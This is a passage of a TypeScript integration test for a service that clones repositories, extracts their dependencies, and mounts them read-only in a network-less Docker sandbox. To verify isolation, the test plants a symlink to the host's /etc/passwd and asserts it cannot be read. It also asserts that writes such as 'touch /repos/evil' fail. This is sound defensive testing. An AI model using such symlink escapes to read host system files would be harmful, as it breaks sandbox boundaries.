    join(srcRepo, 'services', 'rust-svc', 'Cargo.lock'),
    '[[package]]\nname = "actix-web"\nversion = "4.9.0"\n',
  )
  mkdirSync(join(srcRepo, 'services', 'go-svc'), { recursive: true })
  writeFileSync(
    join(srcRepo, 'services', 'go-svc', 'go.sum'),
    'github.com/gin-gonic/gin v1.10.0 h1:abc=\n',
  )

  await exec('git', ['-C', srcRepo, 'add', '.'])
  await exec('git', ['-C', srcRepo, 'commit', '-m', 'initial commit'])
  await exec('git', ['clone', '--bare', srcRepo, bareRepo])

  // 4. Full shallow read-only clone via syncGithubRepos(..., { cloneDir })
  const dataDir = join(workDir, 'workspace-data')
  const projectId = 'proj-greybox-1'
  const reposDir = projectReposDir(dataDir, projectId)
  const synced = await syncGithubRepos(['acme/demo-app'], AbortSignal.timeout(20_000), {
    patPath,
    cloneDir: reposDir,
    gitBaseUrl: `file://${gitOriginParent}`,
  })

  assert.equal(synced.length, 1)
  const repo = synced[0]
  assert.equal(repo.fullName, 'acme/demo-app')
  assert.equal(repo.defaultBranch, 'main')
  assert.equal(repo.mountPath, '/repos/acme/demo-app')
  assert.ok(repo.treeCount >= 52, `Expected all >=52 files in full clone, got ${repo.treeCount}`)
  assert.equal(existsSync(join(reposDir, 'acme', 'demo-app', '.git')), false, '.git must be stripped after checkout.')
  assert.deepEqual(listMountedRepos(reposDir), ['/repos/acme/demo-app'])

  // Verify ALL lockfiles/manifests across the full tree were parsed (no 40-file cap)
  const hasDep = (eco: string, pkg: string, ver: string) =>
    repo.dependencies.some(d => d.ecosystem === eco && d.package === pkg && d.version === ver)
  assert.equal(hasDep('npm', 'next', '14.2.20'), true, 'Lockfile next@14.2.20 should override package.json range.')
  assert.equal(hasDep('npm', 'fastify', '4.28.1'), true, 'yarn.lock fastify should be extracted.')
  assert.equal(hasDep('PyPI', 'fastapi', '0.115.0'), true, 'pyproject.toml fastapi should be extracted.')
  assert.equal(hasDep('PyPI', 'django', '5.1.2'), true, 'pyproject.toml django should be extracted.')
  assert.equal(hasDep('crates.io', 'actix-web', '4.9.0'), true, 'Cargo.lock actix-web should be extracted.')
  assert.equal(hasDep('Go', 'github.com/gin-gonic/gin', '1.10.0'), true, 'go.sum gin should be extracted.')

  // Verify compact inventory spec emitted instead of 512 KB routes blob
  const inventorySpec = repo.specs.find(s => s.name === 'acme/demo-app:inventory')
  assert.ok(inventorySpec, 'Expected compact inventory spec.')
  assert.match(inventorySpec.content, /\/repos\/acme\/demo-app/)
  assert.match(inventorySpec.content, /Branch: main/)
  assert.equal(repo.specs.some(s => s.name.endsWith(':routes-and-handlers')), false, 'Clone mode must not cram routes into a text blob.')

  // Plant an out-of-tree symlink on host to verify Docker OverlayFs allowSymlinks: false blocks reading it
  symlinkSync('/etc/passwd', join(reposDir, 'acme', 'demo-app', 'escape-link'))

  // 5. Mount /repos read-only inside real guardian-worker:local Docker container
  const backend = new LinuxWorkerBackend()

  // Reject invalid reposDir containing commas
  await assert.rejects(
    backend.openSession(randomUUID(), AbortSignal.timeout(5_000), { reposDir: join(workDir, 'bad,dir') }),
    /Invalid repository mount path/,
  )

  const assignmentId = randomUUID()
  const session = await backend.openSession(assignmentId, AbortSignal.timeout(15_000), { reposDir })
  t.after(() => session.close())

  // Inspect Docker container HostConfig to verify readonly bind mount + --network none
  let containerId = ''
  for (let attempt = 0; attempt < 60 && !containerId; attempt += 1) {
    containerId = (await exec('docker', ['ps', '-q', '--filter', 'label=dev.guardian.assignment=' + assignmentId])).stdout.trim()
    if (!containerId) await delay(50)
  }
  assert.ok(containerId, 'Worker container with /repos mount must be running.')
  const inspectData = JSON.parse((await exec('docker', ['inspect', '--format', '{{json .}}', containerId])).stdout)
  assert.equal(inspectData.HostConfig.NetworkMode, 'none')
  assert.equal(inspectData.HostConfig.ReadonlyRootfs, true)
  const repoMount = (inspectData.Mounts as Array<{ Destination: string; RW: boolean; Type: string }>)
    .find(m => m.Destination === '/repos')
  assert.ok(repoMount, '/repos mount must exist in container.')
  assert.equal(repoMount.Type, 'bind')
  assert.equal(repoMount.RW, false, '/repos mount MUST be read-only.')

  // Explore full cloned tree using standard bash tools (find, grep, cat, jq)
  const findRes = await session.exec(
    'find /repos/acme/demo-app -type f | wc -l > /work/count.txt && grep -rn "x-internal-bypass" /repos/acme/demo-app > /work/hit.txt && jq -r .dependencies.express /repos/acme/demo-app/package.json > /work/express.txt',
    ['count.txt', 'hit.txt', 'express.txt'],
    AbortSignal.timeout(10_000),
  )
  assert.equal(findRes.exitCode, 0, `find/grep/jq failed: ${findRes.stderr}`)
  assert.ok(Number(findRes.outputs['count.txt'].trim()) >= 52)
  assert.match(findRes.outputs['hit.txt'], /apps\/admin\/api\/auth\.ts:1:.*x-internal-bypass/)
  assert.equal(findRes.outputs['express.txt'].trim(), '^4.19.0')

  // Verify cat works on nested source files
  const catRes = await session.exec(
    'cat /repos/acme/demo-app/apps/admin/api/auth.ts',
    [],
    AbortSignal.timeout(10_000),
  )
  assert.equal(catRes.exitCode, 0)
  assert.match(catRes.stdout, /checkAdminHeader/)

  // Verify writes to /repos are strictly rejected (read-only enforced)
  const touchRes = await session.exec('touch /repos/evil', [], AbortSignal.timeout(10_000))
  assert.notEqual(touchRes.exitCode, 0, 'touch /repos/evil must fail.')
  assert.match(touchRes.stderr, /EROFS|read-only/i)

  await assert.rejects(
    session.exec('echo x > /repos/acme/demo-app/evil.txt', [], AbortSignal.timeout(10_000)),
    /EROFS|read-only/i,
  )
  assert.equal(existsSync(join(reposDir, 'evil')), false)
  assert.equal(existsSync(join(reposDir, 'acme', 'demo-app', 'evil.txt')), false)

  // Verify out-of-tree symlink cannot be read (allowSymlinks: false)
  const symRes = await session.exec('cat /repos/acme/demo-app/escape-link', [], AbortSignal.timeout(10_000))
  assert.notEqual(symRes.exitCode, 0, 'Symlink pointing outside /repos must not be readable.')
  assert.ok(!symRes.stdout.includes('root:x:0:0'), 'Host /etc/passwd must never be readable via symlink.')

  // Verify one-shot backend.run also mounts /repos read-only
  const oneShot = await backend.run({
    assignmentId: randomUUID(),
    files: [],
    command: 'grep -rn "checkAdminHeader" /repos/acme/demo-app > /work/out.txt',
    outputs: ['out.txt'],
  }, AbortSignal.timeout(15_000), { reposDir })
  assert.equal(oneShot.exitCode, 0)
  assert.match(oneShot.outputs['out.txt'], /apps\/admin\/api\/auth\.ts/)
})
